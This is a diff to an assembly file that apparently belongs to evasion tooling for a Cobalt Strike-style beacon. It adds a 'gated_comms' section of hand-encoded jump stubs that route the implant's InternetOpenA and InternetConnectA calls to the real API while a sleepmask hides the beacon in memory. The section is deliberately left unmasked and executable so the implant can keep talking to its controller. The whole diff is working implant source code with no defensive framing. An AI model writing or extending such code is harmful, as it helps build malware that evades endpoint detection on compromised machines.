@@ -12,8 +12,19 @@
 ;   gated_target:   dq <stub page: the call thunk's `after`>
 ;
 ; sleepmask_bofwin.cpp fills gated_target at engine build and keeps this
-; section out of the mask. Nothing else lives in the section, so nothing of
-; the beacon but these 16 bytes is in the clear while a gated call runs.
+; section out of the mask. Nothing else of the beacon is in the clear while
+; a masked call runs.
+;
+; A user sleepmask (the 4.10+ object) runs the calls it is handed from its
+; own memory, where the same lookup fails for every call - the two comms
+; calls included, masked or not. Those are handed over as these stubs
+; instead (beacon_gate.cpp gate_comms_stub), which jump on to the real API:
+;
+;   gated_comms+0x00:  jmp qword ptr [rip+2]   ; slot at +8: InternetOpenA
+;   gated_comms+0x10:  jmp qword ptr [rip+2]   ; slot at +8: InternetConnectA
+;
+; The section stays executable: beacon_info_fill leaves it MaskSection
+; FALSE, so a kit-conformant mask does not touch it.
 
 gtramp SEGMENT ALIGN(16) 'CODE'
 
@@ -25,6 +36,14 @@ gated_tramp ENDP
 PUBLIC  gated_target
 ALIGN   8
 gated_target DQ 0
+
+PUBLIC  gated_comms
+ALIGN   16
+gated_comms LABEL BYTE
+        DB      0FFh, 25h, 02h, 00h, 00h, 00h, 00h, 00h      ; InternetOpenA: jmp qword ptr [rip+2]
+        DQ      0                                               ; +8: the API
+        DB      0FFh, 25h, 02h, 00h, 00h, 00h, 00h, 00h      ; InternetConnectA (+16)
+        DQ      0                                               ; +24: the API
 
 gtramp ENDS
 
